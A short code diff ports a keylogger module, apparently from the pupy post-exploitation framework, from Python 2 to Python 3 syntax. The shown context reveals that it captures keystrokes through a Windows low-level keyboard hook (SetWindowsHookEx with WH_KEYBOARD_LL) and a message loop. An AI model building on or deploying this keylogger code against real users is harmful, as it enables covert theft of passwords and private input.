@@ -1,3 +1,7 @@
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 # --------------------------------------------------------------
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # All rights reserved.
@@ -16,7 +20,7 @@
 import datetime
 import string
 
-from hookfuncs import (
+from .hookfuncs import (
     GetKeyState, HOOKPROC, SetTimer, MSG, byref,
     GetMessageW, KillTimer, GetModuleHandleW, SetWindowsHookEx,
     WH_KEYBOARD_LL, WinError, UnhookWindowsHookEx,
@@ -127,7 +131,7 @@ class KeyLogger(pupy.Task):
             while self.active:
                 try:
                     GetMessageW(msgptr, None, 0, 0)
-                except Exception, e:
+                except Exception as e:
                     raise ValueError('Shit: {} / {} / {} / {}'.format(msg, msgptr, GetMessageW, e))
 
         finally:
